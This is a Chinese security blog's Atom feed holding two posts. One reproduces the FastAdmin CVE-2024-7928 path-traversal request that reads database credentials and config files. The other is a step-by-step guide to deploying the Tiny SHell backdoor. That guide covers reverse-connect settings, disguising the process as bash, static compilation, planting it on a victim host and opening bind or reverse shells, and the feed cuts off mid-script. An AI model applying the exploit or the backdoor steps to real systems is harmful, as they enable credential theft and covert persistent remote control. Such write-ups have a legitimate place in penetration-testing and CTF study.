<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nobody&#39;s Blog</title>
  
  
  <link href="https://qwegz.github.io/atom.xml" rel="self"/>
  
  <link href="https://qwegz.github.io/"/>
  <updated>2025-02-20T05:32:54.338Z</updated>
  <id>https://qwegz.github.io/</id>
  
  <author>
    <name>nobody</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://qwegz.github.io/2025/02/20/CVE-2024-7928%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-fastadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://qwegz.github.io/2025/02/20/CVE-2024-7928%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-fastadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2025-02-20T05:32:15.824Z</published>
    <updated>2025-02-20T05:32:54.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2024-7928分析复现-fastadmin任意文件读取漏洞"><a href="#CVE-2024-7928分析复现-fastadmin任意文件读取漏洞" class="headerlink" title="CVE-2024-7928分析复现-fastadmin任意文件读取漏洞"></a>CVE-2024-7928分析复现-fastadmin任意文件读取漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><pre><code>FastAdmin 是一款基于PHP+Bootstrap的开源后台框架，专为开发者精心打造。它基于ThinkPHP和Bootstrap两大主流技术构建，拥有完善的权限管理系统和一键生成CRUD等强大功能。FastAdmin致力于提高开发效率，降低开发成本，同时确保后台系统的稳定性和安全性。  FastAdmin &lt; V1.3.4.20220530的版本均存在任意文件读取漏洞，攻击者利用此漏洞可以获取系统敏感信息。漏洞简介里写的是任意文件读取漏洞，但实际用起来读不了`/etc/passwd`​等其他敏感文件，故写此文章复现</code></pre><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>官网提供的完整包只提供了最新的几个版本，所以老版本需要自己下载源码并且用`composer`​和`bower`​安装完整依赖我选择版本为`v1.3.3.20220121`​，[源码链接](https://github.com/karsonzhang/fastadmin/tree/v1.3.3.20220121)，建议用`php7.4`​`composer`​建议从[这里](https://getcomposer.org/download/)下载`composer.phar`​，避免与`php7.4`​存在兼容性问题  并且配置好本地的的`apache`​+`mysql`​即可进行安装</code></pre><p>​<img src="/assets/image-20250219120642-b0v8x5x.png" alt="image" title="安装fastadmin">​</p><pre><code>调试环境搭建参考[phpstorm官网调试文档](https://www.jetbrains.com/help/phpstorm/2023.3/zero-configuration-debugging.html)</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>网上所有的POC都是这样写的，能够读取到数据库的密码等配置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index/ajax/lang?lang=../../application/database</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>​<img src="/assets/image-20250219122339-si0n5tm.png" alt="image" title="实网环境复现成功">​</p><pre><code>如果成功应该如上图所示，能够看到数据库的连接信息。我本地未打通，和[这篇复现文章](https://cn-sec.com/archives/3110662.html)结果相同</code></pre><p><img src="/assets/image-20250219163526-uuedrgh.png" alt="image" title="本地复现失败">​</p><pre><code>本地未打通漏洞，为此接口的正常行为，返回了`application/index/lang/zh-cn.php`​里的内容，部分如下</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;Keep login&#x27;</span>                                             =&gt; <span class="string">&#x27;保持会话&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Forgot password&#x27;</span>                                        =&gt; <span class="string">&#x27;忘记密码?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Username&#x27;</span>                                               =&gt; <span class="string">&#x27;用户名&#x27;</span>,</span><br></pre></td></tr></table></figure><p>‍</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><pre><code>通过查看[补丁方案](https://ask.fastadmin.net/question/46696.html) 和 [git记录](https://github.com/karsonzhang/fastadmin/commit/c5285b8fddbd6959573bbc79af0d6cf52e8c2407)，可以定位漏洞点在`application/index/controller/Ajax.php`​</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 加载语言包</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$header</span> = [<span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&#x27;application/javascript&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">config</span>(<span class="string">&#x27;app_debug&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$offset</span> = <span class="number">30</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>; <span class="comment">// 缓存一个月</span></span><br><span class="line">        <span class="variable">$header</span>[<span class="string">&#x27;Cache-Control&#x27;</span>] = <span class="string">&#x27;public&#x27;</span>;</span><br><span class="line">        <span class="variable">$header</span>[<span class="string">&#x27;Pragma&#x27;</span>] = <span class="string">&#x27;cache&#x27;</span>;</span><br><span class="line">        <span class="variable">$header</span>[<span class="string">&#x27;Expires&#x27;</span>] = <span class="title function_ invoke__">gmdate</span>(<span class="string">&quot;D, d M Y H:i:s&quot;</span>, <span class="title function_ invoke__">time</span>() + <span class="variable">$offset</span>) . <span class="string">&quot; GMT&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$controllername</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;controllername&quot;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadlang</span>(<span class="variable">$controllername</span>);</span><br><span class="line">    <span class="comment">//强制输出JSON Object</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">jsonp</span>(<span class="title class_">Lang</span>::<span class="title function_ invoke__">get</span>(), <span class="number">200</span>, <span class="variable">$header</span>, [<span class="string">&#x27;json_encode_param&#x27;</span> =&gt; JSON_FORCE_OBJECT | JSON_UNESCAPED_UNICODE]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>补丁方案之一就是在此处添加过滤但是打入POC `/index/ajax/lang?lang=../../application/database`​后，此处调试，并未发现`GET`​传参的`lang`​参数被传给`loadlang`​![image](assets/image-20250219164941-13mil5t.png &quot;本地调试POC未打通&quot;)​跟踪`$this-&gt;loadlang($controllername);`​，找到`application/common/controller/Frontend.php`​里的`loadlang`​函数</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 加载语言文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">loadlang</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> =  <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="title class_">Lang</span>::<span class="title function_ invoke__">load</span>(APP_PATH . <span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">module</span>() . <span class="string">&#x27;/lang/&#x27;</span> . <span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">langset</span>() . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>) . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>可以看到此处`load`​到的文件后缀名一定是`.php`​如果直接传参`controllername`​，则此处传入的`$name`​可控，但是会通过`str_replace(&#39;.&#39;, &#39;/&#39;, $name)`​函数将`.`​替换成`/`​，无法实现路径穿越？？？本地未打通</code></pre><h3 id="利用方式分析"><a href="#利用方式分析" class="headerlink" title="利用方式分析"></a>利用方式分析</h3><pre><code>虽然本地未打通，但是根据已搭建好的目录结果和文件可以知道能读取哪些文件。</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index/ajax/lang?lang=../../application/database</span><br></pre></td></tr></table></figure><pre><code>读取`application/database.php`​里的内容，部分如下。可以看到和`application/index/lang/zh-cn.php`​里的内容格式是完全相同的，都是`php`​文件直接`return`​1个`array`​</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Env</span>;</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 数据库类型</span></span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>            =&gt; <span class="title class_">Env</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;database.type&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>),</span><br><span class="line">    <span class="comment">// 服务器地址</span></span><br><span class="line">    <span class="string">&#x27;hostname&#x27;</span>        =&gt; <span class="title class_">Env</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;database.hostname&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>),</span><br><span class="line">    <span class="comment">// 数据库名</span></span><br><span class="line">    <span class="string">&#x27;database&#x27;</span>        =&gt; <span class="title class_">Env</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;database.database&#x27;</span>, <span class="string">&#x27;fastadmin&#x27;</span>),</span><br><span class="line">    <span class="comment">// 用户名</span></span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>        =&gt; <span class="title class_">Env</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;database.username&#x27;</span>, <span class="string">&#x27;root&#x27;</span>),</span><br><span class="line">    <span class="comment">// 密码</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>        =&gt; <span class="title class_">Env</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;database.password&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),</span><br></pre></td></tr></table></figure><pre><code>&lt;span data-type=&quot;text&quot; style=&quot;background-color: var(--b3-font-background8);&quot;&gt;综上得出结论，在权限允许的情况下，可以读取到直接&lt;/span&gt;`return`​&lt;span data-type=&quot;text&quot; style=&quot;background-color: var(--b3-font-background8);&quot;&gt;1个&lt;/span&gt;`array`​&lt;span data-type=&quot;text&quot; style=&quot;background-color: var(--b3-font-background8);&quot;&gt;的.php文件的内容。并不是任意文件读取&lt;/span&gt;有很多文件满足此条件，但有价值的只有3个文件，`application/database.php`​读取数据库用户名密码， `application/config.php`​读取版本号等配置，`application/extra/site.php`​读取网站配置包含版本号，`application/extra/upload.php`​文件上传的配置</code></pre><p>‍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index/ajax/lang?lang=../../application/database</span><br></pre></td></tr></table></figure><pre><code>读取数据库用户名密码</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index/ajax/lang?lang=../../application/config</span><br></pre></td></tr></table></figure><pre><code>读取配置信息，包含版本号</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index/ajax/lang?lang=../../application/extra/site</span><br></pre></td></tr></table></figure><pre><code>读取网站配置包含版本号</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index/ajax/lang?lang=../../application/extra/upload</span><br></pre></td></tr></table></figure><pre><code>读取文件上传的配置</code></pre><p>‍</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://wiki.shikangsi.com/post/share/da0292b8-0f92-4e6e-bdb7-73f47b901acd">【原创】（CVE-2024-7928）FastAdmin &lt; V1.3.4.20220530 任意文件读取漏洞</a></p><p><a href="https://www.fastadmin.net/news/94.html">FastAdmin安全公告</a></p><p><a href="https://ask.fastadmin.net/question/46696.html">lang接口任意文件读取漏洞(CVE-2024-7928)</a></p><p>‍</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CVE-2024-7928分析复现-fastadmin任意文件读取漏洞&quot;&gt;&lt;a href=&quot;#CVE-2024-7928分析复现-fastadmin任意文件读取漏洞&quot; class=&quot;headerlink&quot; title=&quot;CVE-2024-7928分析复现-fastadmin任意文件读取漏洞&quot;&gt;&lt;/a&gt;CVE-2024-7928分析复现-fastadmin任意文件读取漏洞&lt;/h1&gt;&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;FastAdmin 是一款基于PHP+Bootstrap的开源后台框架，专为开发者精心打造。它基于ThinkPHP和Bootstrap两大主流技术构建，拥有完善的权限管理系统和一键生成CRUD等强大功能。FastAdmin致力于提高开发效率，降低开发成本，同时确保后台系统的稳定性和安全性。  
FastAdmin &amp;lt; V1.3.4.20220530的版本均存在任意文件读取漏洞，攻击者利用此漏洞可以获取系统敏感信息。

漏洞简介里写的是任意文件读取漏洞，但实际用起来读不了`/etc/passwd`​等其他敏感文件，故写此文章复现
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>tsh后门使用教程</title>
    <link href="https://qwegz.github.io/2025/02/07/tsh%E5%90%8E%E9%97%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://qwegz.github.io/2025/02/07/tsh%E5%90%8E%E9%97%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
    <published>2025-02-07T11:35:10.000Z</published>
    <updated>2025-02-09T09:05:10.941Z</updated>
    
    <content type="html"><![CDATA[<p>在我们进行渗透测试或者是CTF的AWD模式时，都需要做权限驻留，这里介绍一款开源的UNIX后门</p><span id="more"></span><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><code>Tiny SHell - An open-source UNIX backdoor</code>​</p><p>tsh是一款开源的UNIX后门，能后提供正向连接或反弹连接模式，通信加密，且支持上传、下载。</p><p><a href="https://github.com/orangetw/tsh">源码</a>非常精简</p><p><img src="/assets/image-20240823201052-coltmqz.png" alt="image">​</p><h2 id="使用前的准备工作"><a href="#使用前的准备工作" class="headerlink" title="使用前的准备工作"></a>使用前的准备工作</h2><h3 id="修改tsh-h"><a href="#修改tsh-h" class="headerlink" title="修改tsh.h"></a>修改tsh.h</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;replace with your password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_PORT 7586</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PROC_NAME <span class="string">&quot;/bin/bash&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT_BACK_HOST  <span class="string">&quot;localhost&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT_BACK_DELAY 30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure><p><code>secret</code>​是用于加密通信流量的密钥，每次使用前建议修改</p><p><code>SERVER_PORT</code>​是后门运行时监听的端口</p><p><code>FAKE_PROC_NAME</code>​是伪装后门运行时的进程名字，我一般使用<code>/usr/sbin/bash</code>​</p><p><code>CONNECT_BACK</code>​指的是反弹连接模式用到的信息，如果需要编译主动连接模式则注释掉这2行</p><p><code>CONNECT_BACK_HOST</code>​是反弹shell的控制端IP</p><p><code>CONNECT_BACK_DELAY</code>​是休眠时间，单位是秒，即每多少秒反弹一次（sleep函数在死循环第一行，启动后直接休眠）</p><h4 id="正向连接示例"><a href="#正向连接示例" class="headerlink" title="正向连接示例"></a>正向连接示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;Pass2pAssword1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_PORT 7999</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PROC_NAME <span class="string">&quot;/usr/sbin/bash&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define CONNECT_BACK_HOST  &quot;1.1.1.1&quot;</span></span><br><span class="line"><span class="comment">//#define CONNECT_BACK_DELAY 21600</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>‍</p><h4 id="反弹连接示例"><a href="#反弹连接示例" class="headerlink" title="反弹连接示例"></a>反弹连接示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;Pass2pAssword1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_PORT 7999</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PROC_NAME <span class="string">&quot;/usr/sbin/bash&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT_BACK_HOST  <span class="string">&quot;1.1.1.1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT_BACK_DELAY 21600</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure><p>‍</p><h3 id="修改tsh-c"><a href="#修改tsh-c" class="headerlink" title="修改tsh.c"></a>修改tsh.c</h3><p><img src="/assets/image-20240823202500-7v3gl98.png" alt="image">​</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: tsh_runshell( server, <span class="string">&quot;exec bash --login&quot;</span> ) );</span><br></pre></td></tr></table></figure><p>236行这里这里直接调用系统命令 bash，但如果被控端的环境变量 <code>PATH</code>​ 值中我们的后门程序<code>/usr/sbin/bash</code>​要优先于真bash，则会<code>exec</code>​失败，所以修改为绝对路径<code>/bin/bash</code>​最好，修改后内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: tsh_runshell( server, <span class="string">&quot;exec /bin/bash --login&quot;</span> ) );</span><br></pre></td></tr></table></figure><h3 id="修改Makefile"><a href="#修改Makefile" class="headerlink" title="修改Makefile"></a>修改Makefile</h3><p>Makefile文件中支持了很多的UNIX系统，如<code>linux, freebsd, openbsd</code>​，目前我只用过<code>make linux</code>​编译，默认的编译命令为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">        gcc -O -W -Wall -o tsh  $(CLIENT_OBJ)</span><br><span class="line">        gcc -O -W -Wall -o tshd $(SERVER_OBJ) -lutil -DLINUX</span><br><span class="line">        strip tsh tshd</span><br></pre></td></tr></table></figure><p>问题在于受害者机器上运行的<code>tshd</code>​需要进行<code>static</code>​静态编译，以兼容各种环境，所以修改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">gcc -O -W -Wall -<span class="type">static</span> -o tsh $(CLIENT_OBJ)</span><br><span class="line">gcc -O -W -Wall -<span class="type">static</span> -o tshd $(SERVER_OBJ) -<span class="type">static</span>-libgcc -<span class="type">static</span>-libstdc++ -lutil -DLINUX</span><br><span class="line">strip tsh tshd</span><br></pre></td></tr></table></figure><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>首先编译，生成<code>tsh</code>​和<code>tshd</code>​两个文件，其中<code>tshd</code>​是受害者机器上运行的，<code>tsh</code>​是控制端使用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make linux</span><br></pre></td></tr></table></figure><h3 id="测试环境说明"><a href="#测试环境说明" class="headerlink" title="测试环境说明"></a>测试环境说明</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">控制端ip 192.168.122.133</span><br><span class="line">受害者ip 192.168.122.128</span><br></pre></td></tr></table></figure><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>一般将<code>tshd</code>​重命名为<code>bash</code>​，放在受害者机器的<code>/usr/sbin</code>​目录下面，给<code>/usr/sbin/bash</code>​文件执行权限，然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">umask</span> 077; HOME=/var/tmp; /usr/sbin/bash</span><br></pre></td></tr></table></figure><p><code>umask</code>​设置是为了运行后的后门<code>shell</code>​环境而设置，后门<code>shell</code>​所有创建的文件只有后门<code>shell</code>​进程属主有权限，其他都没权限</p><p>然后在控制端上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh 192.168.122.128</span><br></pre></td></tr></table></figure><p>效果图</p><p><img src="/assets/image-20240823212729-7gyk0m0.png" alt="image">​</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p><code>tsh.h</code>​中确保控制端IP正确，同样编译</p><p>首先在控制端上运行，开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh cb</span><br></pre></td></tr></table></figure><p>一般将<code>tshd</code>​重命名为<code>bash</code>​，放在受害者机器的<code>/usr/sbin</code>​目录下面，给<code>/usr/sbin/bash</code>​文件执行权限，然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">umask</span> 077; HOME=/var/tmp; /usr/sbin/bash</span><br></pre></td></tr></table></figure><p>效果图如下，等待<code>CONNECT_BACK_DELAY</code>​秒</p><p><img src="/assets/image-20240823213517-a7utcqg.png" alt="image">​</p><h2 id="额外说明"><a href="#额外说明" class="headerlink" title="额外说明"></a>额外说明</h2><h3 id="提供下载的web服务python脚本"><a href="#提供下载的web服务python脚本" class="headerlink" title="提供下载的web服务python脚本"></a>提供下载的web服务python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&lt;path:filename&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="comment"># 使用 os.path.abspath 和 os.path.commonprefix 来避免目录穿越</span></span><br><span class="line">    base_dir = os.path.abspath(<span class="string">&#x27;.&#x27;</span>)  <span class="comment"># 当前目录的绝对路径</span></span><br><span class="line">    file_path = os.path.abspath(os.path.join(base_dir, filename))</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 检查文件路径是否位于当前目录内</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_path.startswith(base_dir):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 如果文件存在，则允许下载；否则返回 404 错误</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> send_from_directory(directory=base_dir, path=filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span 